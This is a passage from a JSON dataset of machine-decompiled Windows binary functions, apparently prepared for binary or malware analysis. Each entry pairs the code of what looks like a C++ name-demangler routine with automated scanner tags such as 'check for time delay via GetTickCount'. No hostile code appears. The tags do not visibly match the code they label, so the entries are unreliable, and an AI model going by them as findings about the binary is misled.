*(arg1 + 0x13c);\n        if (-1 < iVar14) {\n            do {\n                if (*puVar24 != 0x2f) break;\n                if (iVar14 == 0) {\n                    puVar24 = *(puVar24 + 4);\n                    if (puVar24 != NULL) {\n                        uVar29 = *puVar24;\n                        goto code_r0x00014000e4c1;\n                    }\n                    break;\n                }\n                puVar24 = *(puVar24 + 6);\n                iVar14 = iVar14 + -1;\n            } while (puVar24 != NULL);\n            if (uVar38 == 0) goto code_r0x00014000e330;\n            goto code_r0x000140010f92;\n        }\n        uStack200 = *(arg1 + 0x128);\n        if (uVar39 != 0x2f) goto code_r0x00014000e4e3;\n    }\n    else {\ncode_r0x00014000e4c1:\n        uStack200 = *(arg1 + 0x128);\n        if ((uVar29 != 0x23) && (uVar39 != uVar29)) {\n            if (uVar29 != 0x24) goto code_r0x00014000e4e3;\n            puVar37 = *(puVar24 + 4);\n            *(arg1 + 0x128) = &stack0xffffffffffffff38;\n            uStack176 = *(arg1 + 0x120);\n            uStack192 = arg3;\n            if (puVar37 != NULL) goto code_r0x00014000e3f8;\ncode_r0x00014000e3ef:\n            puVar37 = *(arg3 + 4);\n            uStack192 = arg3;\n            goto code_r0x00014000e3f8;\n        }\n    }\n    puVar37 = *(puVar24 + 4);\n    arg3 = puVar24;\ncode_r0x00014000e4e3:\n    *(arg1 + 0x128) = &stack0xffffffffffffff38;\n    uStack176 = *(arg1 + 0x120);\n    uStack192 = arg3;\ncode_r0x00014000e3f8:\n    puVar24 = uStack192;\n    aiStack184[0] = 0;\n    uStack256 = 0x14000e405;\n    fcn.1400113f0(arg1, 0x11, puVar37);\n    if (aiStack184[0] == 0) {\n        uStack256 = 0x14001047e;\n        fcn.140011490(arg1, 0x11, puVar24);\n    }\n    *(arg1 + 0x128) = uStack200;\n    if (uVar38 == 0) {\n        return;\n    }\n    *(arg1 + 0x120) = unaff_RDI;\n    return;\n}\n",
        "token_count": 29802
    },
    "14000adb": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint32_t * fcn.14000adb0(int64_t arg1, int32_t *arg2)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    \n    if (arg2 == NULL) {\n        return NULL;\n    }\n    do {\n    // switch table (9 cases) at 0x14010c2b0\n        switch(*arg2) {\n        case 0:\n        case 6:\n            return NULL;\n        case 5:\n            if (*(arg1 + 0x120) == 0) {\n                *(arg1 + 0x130) = 1;\n                return NULL;\n            }\n            iVar3 = arg2[4];\n            piVar1 = *(*(*(arg1 + 0x120) + 8) + 0x18);\n            if (-1 < iVar3) {\n                if (piVar1 == NULL) {\n                    return NULL;\n                }\n                while( true ) {\n                    if (*piVar1 != 0x2f) {\n                        return NULL;\n                    }\n                    if (iVar3 == 0) break;\n                    piVar1 = *(piVar1 + 6);\n                    iVar3 = iVar3 + -1;\n                    if (piVar1 == NULL) {\n                        return NULL;\n                    }\n                }\n                piVar1 = *(piVar1 + 4);\n            }\n            if (piVar1 == NULL) {\n                return NULL;\n            }\n            if (*piVar1 != 0x2f) {\n                return NULL;\n            }\n            return piVar1;\n        default:\n            uVar2 = *arg2 - 0x18;\n            if (uVar2 < 0x36) {\n                if ((1 << (uVar2 & 0x3f) & 0x338c0004108001U) != 0) {\n                    return NULL;\n                }\n                if (uVar2 == 0x1b) goto code_r0x00014000ae19;\n            }\n        case 1:\n        case 2:\n        case 3:\n        case 4:\n            piVar1 = fcn.14000adb0(arg1, *(arg2 + 4));\n            if (piVar1 != NULL) {\n                return piVar1;\n            }\n        case 7:\n        case 8:\ncode_r0x00014000ae19:\n            arg2 = *(arg2 + 6);\n            if (arg2 == NULL) {\n                return NULL;\n            }\n        }\n    } while( true );\n}\n",
        "token_count": 554
    },
    "14000bef": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00014000a6e0)\n// WARNING: Removing unreachable block (ram,0x00014000a681)\n// WARNING: Removing unreachable block (ram,0x00014000a730)\n// WARNING: Removing unreachable block (ram,0x00014000a743)\n// WARNING: Removing unreachable block (ram,0x00014000a6e8)\n// WARNING: Removing unreachable block (ram,0x00014000a6f7)\n// WARNING: Removing unreachable block (ram,0x00014000a74f)\n// WARNING: Removing unreachable block (ram,0x00014000a754)\n// WARNING: Removing unreachable block (ram,0x00014000a75d)\n// WARNING: Removing unreachable block (ram,0x00014000a6fe)\n// WARNING: Removing unreachable block (ram,0x00014000a69e)\n// WARNING: Removing unreachable block (ram,0x00014000a6a3)\n// WARNING: Removing unreachable block (ram,0x00014000a6a8)\n// WARNING: Removing unreachable block (ram,0x00014000a6b2)\n// WARNING: Removing unreachable block (ram,0x00014000a705)\n// WARNING: Removing unreachable block (ram,0x00014000a707)\n\nulong fcn.14000bef0(int64_t arg1, ulong arg2)\n\n{\n    ulong uVar1;\n    int64_t iVar2;\n    \n    if (**(arg1 + 0x18) == 'J') {\n        *(arg1 + 0x18) = *(arg1 + 0x18) + 1;\n    }\n    else if (arg2 == 0) {\n        iVar2 = fcn.14000be10(arg1);\n        goto joined_r0x00014000bf24;\n    }\n    iVar2 = fcn.14000b340(arg1);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    iVar2 = fcn.14000be10(arg1);\njoined_r0x00014000bf24:\n    if (iVar2 == 0) {\n        return 0;\n    }\n    // WARNING: Could not recover jumptable at 0x00014000a726. Too many branches\n    // WARNING: Treating indirect jump as call\n    uVar1 = (*(*0x14010c140 + 0x14010c140))();\n    return uVar1;\n}\n",
        "token_count": 541
    },
    "14000d3c": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00014000a69e)\n// WARNING: Removing unreachable block (ram,0x00014000a6e0)\n// WARNING: Removing unreachable block (ram,0x00014000a681)\n// WARNING: Removing unreachable block (ram,0x00014000a730)\n// WARNING: Removing unreachable block (ram,0x00014000a743)\n// WARNING: Removing unreachable block (ram,0x00014000a6e8)\n// WARNING: Removing unreachable block (ram,0x00014000a6f7)\n// WARNING: Removing unreachable block (ram,0x00014000a74f)\n// WARNING: Removing unreachable block (ram,0x00014000a6fe)\n// WARNING: Removing unreachable block (ram,0x00014000a754)\n// WARNING: Removing unreachable block (ram,0x00014000a75d)\n// WARNING: Removing unreachable block (ram,0x00014000a6a3)\n// WARNING: Removing unreachable block (ram,0x00014000a6a8)\n// WARNING: Removing unreachable block (ram,0x00014000a6b2)\n// WARNING: Removing unreachable block (ram,0x00014000a705)\n// WARNING: Removing unreachable block (ram,0x00014000a707)\n\nulong fcn.14000d3c0(int64_t arg1, ulong arg2)\n\n{\n    uint uVar1;\n    ulong uVar2;\n    int64_t iVar3;\n    int64_t *piVar4;\n    int64_t aiStack48 [2];\n    \n    aiStack48[0] = 0;\n    piVar4 = aiStack48;\n    if (**(arg1 + 0x18) == arg2) {\n        *(arg1 + 0x18) = *(arg1 + 0x18) + 1;\n    // WARNING: Could not recover jumptable at 0x00014000a726. Too many branches\n    // WARNING: Treating indirect jump as call\n        uVar2 = (*(*0x14010c154 + 0x14010c140))();\n        return uVar2;\n    }\n    while( true ) {\n        uVar1 = *(arg1 + 0x4c);\n        *(arg1 + 0x4c) = 1;\n        iVar3 = fcn.14000cbe0(arg1);\n        *(arg1 + 0x4c) = uVar1;\n        if (iVar3 == 0) {\n            return 0;\n        }\n        iVar3 = fcn.14000a670(arg1, 0x2e, iVar3, 0);\n        *piVar4 = iVar3;\n        if (iVar3 == 0) break;\n        piVar4 = iVar3 + 0x18;\n        if (**(arg1 + 0x18) == arg2) {\n            *(arg1 + 0x18) = *(arg1 + 0x18) + 1;\n            return aiStack48[0];\n        }\n    }\n    return 0;\n}\n",
        "token_count": 678
    },
    "14001149": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.140011490(uchar *arg1, ulong noname_1, int32_t *arg3)\n\n{\n    char cVar1;\n    uchar uVar2;\n    int32_t iVar3;\n    int64_t iVar4;\n    int64_t iVar5;\n    int64_t iVar6;\n    uchar *puVar7;\n    char *pcVar8;\n    ulong uVar9;\n    \n    if (0x4e < *arg3 - 3U) goto code_r0x0001400114c3;\n    // switch table (79 cases) at 0x14010cae0\n    switch(*((*arg3 - 3U) * 4 + 0x14010cae0) + 0x14010cae0) {\n    case 0x1400114e0:\n        pcVar8 = \" restrict\";\n        iVar5 = *(arg1 + 0x100);\n        do {\n            cVar1 = *pcVar8;\n            if (iVar5 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar4 = 1;\n                iVar5 = 0;\n            }\n            else {\n                iVar4 = iVar5 + 1;\n            }\n            pcVar8 = pcVar8 + 1;\n            *(arg1 + 0x100) = iVar4;\n            arg1[iVar5] = cVar1;\n            arg1[0x108] = cVar1;\n            iVar5 = iVar4;\n        } while (pcVar8 != \"\");\n        break;\n    case 0x140011558:\n        pcVar8 = \" volatile\";\n        iVar5 = *(arg1 + 0x100);\n        do {\n            cVar1 = *pcVar8;\n            if (iVar5 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar4 = 1;\n                iVar5 = 0;\n            }\n            else {\n                iVar4 = iVar5 + 1;\n            }\n            pcVar8 = pcVar8 + 1;\n            *(arg1 + 0x100) = iVar4;\n            arg1[iVar5] = cVar1;\n            arg1[0x108] = cVar1;\n            iVar5 = iVar4;\n        } while (pcVar8 != \"\");\n        break;\n    case 0x1400115d0:\n        pcVar8 = \" const\";\n        iVar5 = *(arg1 + 0x100);\n        do {\n            cVar1 = *pcVar8;\n            if (iVar5 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar4 = 1;\n                iVar5 = 0;\n            }\n            else {\n                iVar4 = iVar5 + 1;\n            }\n            pcVar8 = pcVar8 + 1;\n            *(arg1 + 0x100) = iVar4;\n            arg1[iVar5] = cVar1;\n            arg1[0x108] = cVar1;\n            iVar5 = iVar4;\n        } while (pcVar8 != \"\");\n        break;\n    case 0x140011648:\n        pcVar8 = \" throw\";\n        iVar5 = *(arg1 + 0x100);\n        do {\n            cVar1 = *pcVar8;\n            if (iVar5 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar4 = 1;\n                iVar5 = 0;\n            }\n            else {\n                iVar4 = iVar5 + 1;\n            }\n            pcVar8 = pcVar8 + 1;\n            *(arg1 + 0x100) = iVar4;\n            arg1[iVar5] = cVar1;\n            arg1[0x108] = cVar1;\n            iVar5 = iVar4;\n        } while (pcVar8 != \"\");\ncode_r0x000140011b08:\n        iVar5 = *(arg3 + 6);\n        if (iVar5 != 0) {\n            if (iVar4 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar5 = *(arg3 + 6);\n                iVar4 = 0;\n                iVar6 = 1;\n            }\n            else {\n                iVar6 = iVar4 + 1;\n            }\n            *(arg1 + 0x100) = iVar6;\n            arg1[iVar4] = 0x28;\n            arg1[0x108] = 0x28;\ncode_r0x000140011b44:\n            fcn.1400113f0(arg1, 0x11, iVar5);\n            iVar5 = *(arg1 + 0x100);\n            if (iVar5 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar4 = 1;\n                iVar5 = 0;\n            }\n            else {\n                iVar4 = iVar5 + 1;\n            }\n            *(arg1 + 0x100) = iVar4;\n            arg1[iVar5] = 0x29;\n            arg1[0x108] = 0x29;\n            return;\n        }\n        break;\n    case 0x1400116c0:\n        iVar4 = *(arg1 + 0x100);\n        if (iVar4 != 0xff) {\n            iVar5 = iVar4 + 1;\n            *(arg1 + 0x100) = iVar5;\n            arg1[iVar4] = 0x20;\n            arg1[0x108] = 0x20;\n            goto code_r0x00014001176f;\n        }\n        arg1[0xff] = 0;\n        (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n        *arg1 = 0x20;\n        iVar5 = 1;\n        *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\ncode_r0x00014001177b:\n        iVar4 = iVar5 + 1;\n        goto code_r0x00014001177f;\n    case 0x1400116f0:\n        iVar4 = *(arg1 + 0x100);\n        if (iVar4 == 0xff) {\n            arg1[0xff] = 0;\n            (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n            *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n            iVar5 = 1;\n            iVar4 = 0;\n        }\n        else {\n            iVar5 = iVar4 + 1;\n        }\n        *(arg1 + 0x100) = iVar5;\n        arg1[iVar4] = 0x20;\n        arg1[0x108] = 0x20;\n        goto code_r0x0001400117a7;\n    case 0x140011720:\n        iVar5 = *(arg1 + 0x100);\n        if (iVar5 == 0xff) {\n            arg1[0xff] = 0;\n            (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n            *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n            iVar4 = 1;\n            iVar5 = 0;\n        }\n        else {\n            iVar4 = iVar5 + 1;\n        }\n        *(arg1 + 0x100) = iVar4;\n        arg1[iVar5] = 0x20;\n        arg1[0x108] = 0x20;\n        arg3 = *(arg3 + 6);\n        goto code_r0x0001400114c3;\n    case 0x140011758:\n        arg3 = *(arg3 + 4);\n    case 0x1400113f0:\ncode_r0x0001400114c3:\n        if (((arg3 != NULL) && (arg3[1] < 2)) && (iVar3 = *(arg1 + 0x134),  iVar3 < 0x401)) {\n            arg3[1] = arg3[1] + 1;\n            uVar9 = *(arg1 + 0x148);\n            *(arg1 + 0x134) = iVar3 + 1;\n            *(arg1 + 0x148) = &stack0xffffffffffffffd8;\n            fcn.14000e2e0(arg1, 0x11, arg3);\n            *(arg1 + 0x148) = uVar9;\n            arg3[1] = arg3[1] + -1;\n            *(arg1 + 0x134) = *(arg1 + 0x134) + -1;\n            return;\n        }\n        *(arg1 + 0x130) = 1;\n        return;\n    case 0x140011768:\n        iVar5 = *(arg1 + 0x100);\ncode_r0x00014001176f:\n        if (iVar5 != 0xff) goto code_r0x00014001177b;\n        arg1[0xff] = 0;\n        (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n        *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n        iVar4 = 1;\n        iVar5 = 0;\ncode_r0x00014001177f:\n        *(arg1 + 0x100) = iVar4;\n        arg1[iVar5] = 0x26;\n        arg1[0x108] = 0x26;\n        break;\n    case 0x1400117a0:\n        iVar5 = *(arg1 + 0x100);\ncode_r0x0001400117a7:\n        puVar7 = 0x14010cab6;\n        do {\n            uVar2 = *puVar7;\n            if (iVar5 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar4 = 1;\n                iVar5 = 0;\n            }\n            else {\n                iVar4 = iVar5 + 1;\n            }\n            puVar7 = puVar7 + 1;\n            *(arg1 + 0x100) = iVar4;\n            arg1[iVar5] = uVar2;\n            arg1[0x108] = uVar2;\n            iVar5 = iVar4;\n        } while (puVar7 != 0x14010cab8);\n        break;\n    case 0x140011818:\n        pcVar8 = \" _Complex\";\n        iVar5 = *(arg1 + 0x100);\n        do {\n            cVar1 = *pcVar8;\n            if (iVar5 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar4 = 1;\n                iVar5 = 0;\n            }\n            else {\n                iVar4 = iVar5 + 1;\n            }\n            pcVar8 = pcVar8 + 1;\n            *(arg1 + 0x100) = iVar4;\n            arg1[iVar5] = cVar1;\n            arg1[0x108] = cVar1;\n            iVar5 = iVar4;\n        } while (pcVar8 != \"\");\n        break;\n    case 0x140011890:\n        pcVar8 = \" _Imaginary\";\n        iVar5 = *(arg1 + 0x100);\n        do {\n            cVar1 = *pcVar8;\n            if (iVar5 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar4 = 1;\n                iVar5 = 0;\n            }\n            else {\n                iVar4 = iVar5 + 1;\n            }\n            pcVar8 = pcVar8 + 1;\n            *(arg1 + 0x100) = iVar4;\n            arg1[iVar5] = cVar1;\n            arg1[0x108] = cVar1;\n            iVar5 = iVar4;\n        } while (pcVar8 != \"\");\n        break;\n    case 0x140011908:\n        if (arg1[0x108] != '(') {\n            iVar5 = *(arg1 + 0x100);\n            if (iVar5 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar4 = 1;\n                iVar5 = 0;\n            }\n            else {\n                iVar4 = iVar5 + 1;\n            }\n            *(arg1 + 0x100) = iVar4;\n            arg1[iVar5] = 0x20;\n            arg1[0x108] = 0x20;\n        }\n        puVar7 = 0x14010cacf;\n        fcn.1400113f0(arg1, 0x11, *(arg3 + 4));\n        iVar5 = *(arg1 + 0x100);\n        do {\n            uVar2 = *puVar7;\n            if (iVar5 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar4 = 1;\n                iVar5 = 0;\n            }\n            else {\n                iVar4 = iVar5 + 1;\n            }\n            puVar7 = puVar7 + 1;\n            *(arg1 + 0x100) = iVar4;\n            arg1[iVar5] = uVar2;\n            arg1[0x108] = uVar2;\n            iVar5 = iVar4;\n        } while (puVar7 != 0x14010cad2);\n        break;\n    case 0x1400119a0:\n        pcVar8 = \" __vector(\";\n        iVar5 = *(arg1 + 0x100);\n        do {\n            cVar1 = *pcVar8;\n            if (iVar5 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar4 = 1;\n                iVar5 = 0;\n            }\n            else {\n                iVar4 = iVar5 + 1;\n            }\n            pcVar8 = pcVar8 + 1;\n            *(arg1 + 0x100) = iVar4;\n            arg1[iVar5] = cVar1;\n            arg1[0x108] = cVar1;\n            iVar5 = iVar4;\n        } while (pcVar8 != \"\");\n        iVar5 = *(arg3 + 4);\n        goto code_r0x000140011b44;\n    case 0x140011a18:\n        pcVar8 = \" transaction_safe\";\n        iVar5 = *(arg1 + 0x100);\n        do {\n            cVar1 = *pcVar8;\n            if (iVar5 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar4 = 1;\n                iVar5 = 0;\n            }\n            else {\n                iVar4 = iVar5 + 1;\n            }\n            pcVar8 = pcVar8 + 1;\n            *(arg1 + 0x100) = iVar4;\n            arg1[iVar5] = cVar1;\n            arg1[0x108] = cVar1;\n            iVar5 = iVar4;\n        } while (pcVar8 != \"\");\n        break;\n    case 0x140011a90:\n        pcVar8 = \" noexcept\";\n        iVar5 = *(arg1 + 0x100);\n        do {\n            cVar1 = *pcVar8;\n            if (iVar5 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar4 = 1;\n                iVar5 = 0;\n            }\n            else {\n                iVar4 = iVar5 + 1;\n            }\n            pcVar8 = pcVar8 + 1;\n            *(arg1 + 0x100) = iVar4;\n            arg1[iVar5] = cVar1;\n            arg1[0x108] = cVar1;\n            iVar5 = iVar4;\n        } while (pcVar8 != \"\");\n        goto code_r0x000140011b08;\n    case 0x140011bc0:\n        iVar5 = *(arg1 + 0x100);\n        if (iVar5 == 0xff) {\n            arg1[0xff] = 0;\n            (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n            *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n            iVar4 = 1;\n            iVar5 = 0;\n        }\n        else {\n            iVar4 = iVar5 + 1;\n        }\n        *(arg1 + 0x100) = iVar4;\n        arg1[iVar5] = 0x2a;\n        arg1[0x108] = 0x2a;\n    }\n    return;\n}\n",
        "token_count": 4386
    },
    "1400126f": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.1400126f0(int64_t arg1, ulong noname_1, int32_t *arg3)\n\n{\n    uchar uVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    uchar *puVar5;\n    uchar *puVar6;\n    int32_t *piStack40;\n    ulong uVar7;\n    \n    if (*arg3 == 0x32) {\n        iVar4 = *(*(arg3 + 4) + 0x10);\n        puVar6 = *(*(arg3 + 4) + 8);\n        if (iVar4 != 0) {\n            puVar5 = puVar6 + iVar4;\n            iVar4 = *(arg1 + 0x100);\n            do {\n                uVar1 = *puVar6;\n                if (iVar4 == 0xff) {\n                    *(arg1 + 0xff) = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                    iVar3 = 1;\n                    iVar4 = 0;\n                }\n                else {\n                    iVar3 = iVar4 + 1;\n                }\n                puVar6 = puVar6 + 1;\n                *(arg1 + 0x100) = iVar3;\n                *(arg1 + iVar4) = uVar1;\n                *(arg1 + 0x108) = uVar1;\n                iVar4 = iVar3;\n            } while (puVar6 != puVar5);\n        }\n        return;\n    }\n    if (((arg3 != NULL) && (arg3[1] < 2)) && (iVar2 = *(arg1 + 0x134),  iVar2 < 0x401)) {\n        arg3[1] = arg3[1] + 1;\n        uVar7 = *(arg1 + 0x148);\n        *(arg1 + 0x134) = iVar2 + 1;\n        *(arg1 + 0x148) = &piStack40;\n        piStack40 = arg3;\n        fcn.14000e2e0(arg1, 0x11, arg3);\n        *(arg1 + 0x148) = uVar7;\n        arg3[1] = arg3[1] + -1;\n        *(arg1 + 0x134) = *(arg1 + 0x134) + -1;\n        return;\n    }\n    *(arg1 + 0x130) = 1;\n    return;\n}\n",
        "token_count": 581
    },
    "140012f3": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nulong fcn.140012f30(int64_t arg1, ulong noname_1, int64_t arg3)\n\n{\n    char cVar1;\n    uchar uVar2;\n    uint uVar3;\n    ulong arg3_00;\n    int64_t iVar4;\n    int64_t iVar5;\n    uchar *puVar6;\n    char *pcVar7;\n    int32_t *arg3_01;\n    int32_t *piVar8;\n    \n    pcVar7 = **(*(arg3 + 0x10) + 0x10);\n    if (*pcVar7 != 'f') {\n        return 0;\n    }\n    piVar8 = NULL;\n    arg3_01 = *(*(arg3 + 0x18) + 0x18);\n    arg3_00 = *(*(arg3 + 0x18) + 0x10);\n    if (*arg3_01 == 0x3c) {\n        piVar8 = *(arg3_01 + 6);\n        arg3_01 = *(arg3_01 + 4);\n    }\n    uVar3 = *(arg1 + 0x13c);\n    *(arg1 + 0x13c) = 0xffffffff;\n    cVar1 = pcVar7[1];\n    if (cVar1 == 'l') {\n        pcVar7 = \"(...\";\n        iVar5 = *(arg1 + 0x100);\n        do {\n            cVar1 = *pcVar7;\n            if (iVar5 == 0xff) {\n                *(arg1 + 0xff) = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar4 = 1;\n                iVar5 = 0;\n            }\n            else {\n                iVar4 = iVar5 + 1;\n            }\n            pcVar7 = pcVar7 + 1;\n            *(arg1 + 0x100) = iVar4;\n            *(arg1 + iVar5) = cVar1;\n            *(arg1 + 0x108) = cVar1;\n            iVar5 = iVar4;\n        } while (pcVar7 != \"\");\n        fcn.1400126f0(arg1, 0x11, arg3_00);\n    }\n    else {\n        if ('l' < cVar1) {\n            if (cVar1 == 'r') {\n                iVar5 = *(arg1 + 0x100);\n                if (iVar5 == 0xff) {\n                    *(arg1 + 0xff) = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                    iVar4 = 1;\n                    iVar5 = 0;\n                }\n                else {\n                    iVar4 = iVar5 + 1;\n                }\n                *(arg1 + 0x100) = iVar4;\n                *(arg1 + iVar5) = 0x28;\n                pcVar7 = \"...)\";\n                *(arg1 + 0x108) = 0x28;\n                fcn.140012d80(arg1, 0x11, arg3_01);\n                fcn.1400126f0(arg1, 0x11, arg3_00);\n                iVar5 = *(arg1 + 0x100);\n                do {\n                    cVar1 = *pcVar7;\n                    if (iVar5 == 0xff) {\n                        *(arg1 + 0xff) = 0;\n                        (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                        *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                        iVar4 = 1;\n                        iVar5 = 0;\n                    }\n                    else {\n                        iVar4 = iVar5 + 1;\n                    }\n                    pcVar7 = pcVar7 + 1;\n                    *(arg1 + 0x100) = iVar4;\n                    *(arg1 + iVar5) = cVar1;\n                    *(arg1 + 0x108) = cVar1;\n                    iVar5 = iVar4;\n                } while (pcVar7 != \"\");\n            }\n            goto code_r0x0001400130a9;\n        }\n        if ((cVar1 != 'L') && (cVar1 != 'R')) goto code_r0x0001400130a9;\n        iVar5 = *(arg1 + 0x100);\n        if (iVar5 == 0xff) {\n            *(arg1 + 0xff) = 0;\n            (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n            *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n            iVar4 = 1;\n            iVar5 = 0;\n        }\n        else {\n            iVar4 = iVar5 + 1;\n        }\n        *(arg1 + 0x100) = iVar4;\n        *(arg1 + iVar5) = 0x28;\n        puVar6 = 0x14010c8aa;\n        *(arg1 + 0x108) = 0x28;\n        fcn.140012d80(arg1, 0x11, arg3_01);\n        fcn.1400126f0(arg1, 0x11, arg3_00);\n        iVar5 = *(arg1 + 0x100);\n        do {\n            uVar2 = *puVar6;\n            if (iVar5 == 0xff) {\n                *(arg1 + 0xff) = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar4 = 1;\n                iVar5 = 0;\n            }\n            else {\n                iVar4 = iVar5 + 1;\n            }\n            puVar6 = puVar6 + 1;\n            *(arg1 + 0x100) = iVar4;\n            *(arg1 + iVar5) = uVar2;\n            *(arg1 + 0x108) = uVar2;\n            iVar5 = iVar4;\n        } while (puVar6 != 0x14010c8ad);\n        fcn.1400126f0(arg1, 0x11, arg3_00);\n        arg3_01 = piVar8;\n    }\n    fcn.140012d80(arg1, 0x11, arg3_01);\n    iVar5 = *(arg1 + 0x100);\n    if (iVar5 == 0xff) {\n        *(arg1 + 0xff) = 0;\n        (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n        *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n        iVar4 = 1;\n        iVar5 = 0;\n    }\n    else {\n        iVar4 = iVar5 + 1;\n    }\n    *(arg1 + 0x100) = iVar4;\n    *(arg1 + iVar5) = 0x29;\n    *(arg1 + 0x108) = 0x29;\ncode_r0x0001400130a9:\n    *(arg1 + 0x13c) = uVar3;\n    return 1;\n}\n",
        "token_count": 1692
    },
    "1400132c": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nulong fcn.1400132c0(int64_t arg1, ulong noname_1, uint32_t *arg3)\n\n{\n    uint8_t uVar1;\n    char *pcVar2;\n    ulong arg3_00;\n    uchar uVar3;\n    char cVar4;\n    int64_t iVar5;\n    int64_t iVar6;\n    uint32_t *arg3_01;\n    uchar *puVar7;\n    \n    if ((((*arg3 & 0xfffffffd) == 0x38) && (pcVar2 = **(*(arg3 + 4) + 0x10),  *pcVar2 == 'd')) &&\n       ((uVar1 = pcVar2[1],  (uVar1 & 0xdf) == 0x58 || (uVar1 == 0x69)))) {\n        arg3_00 = *(*(arg3 + 6) + 0x10);\n        arg3_01 = *(*(arg3 + 6) + 0x18);\n        iVar5 = *(arg1 + 0x100);\n        if (uVar1 == 0x69) {\n            if (iVar5 == 0xff) {\n                *(arg1 + 0xff) = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x140) = *(arg1 + 0x140) + 1;\n                iVar6 = 1;\n                iVar5 = 0;\n            }\n            else {\n                iVar6 = iVar5 + 1;\n            }\n            *(arg1 + 0x100) = iVar6;\n            *(arg1 + iVar5) = 0x2e;\n            uVar3 = 0x2e;\n        }\n        else {\n            if (iVar5 == 0xff) {\n                *(arg1 